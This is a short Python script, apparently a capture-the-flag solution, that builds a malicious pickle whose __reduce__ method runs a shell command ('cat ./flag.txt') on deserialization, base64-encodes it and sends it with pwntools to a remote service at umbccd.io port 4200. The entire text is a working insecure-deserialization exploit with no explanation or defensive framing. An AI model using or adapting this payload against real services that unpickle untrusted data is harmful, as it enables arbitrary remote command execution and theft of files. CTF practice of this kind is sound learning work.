import pickle
import base64
import subprocess
from pwn import *

class EvilPickle(object):
    def __reduce__(self):
        return (subprocess.Popen, (('cat', './flag.txt'),))

pickle_data = base64.b64encode(pickle.dumps(EvilPickle())).decode()
print(pickle_data)
r = remote("umbccd.io", 4200)
r.recv()
r.sendline("import "+ pickle_data)
r.interactive()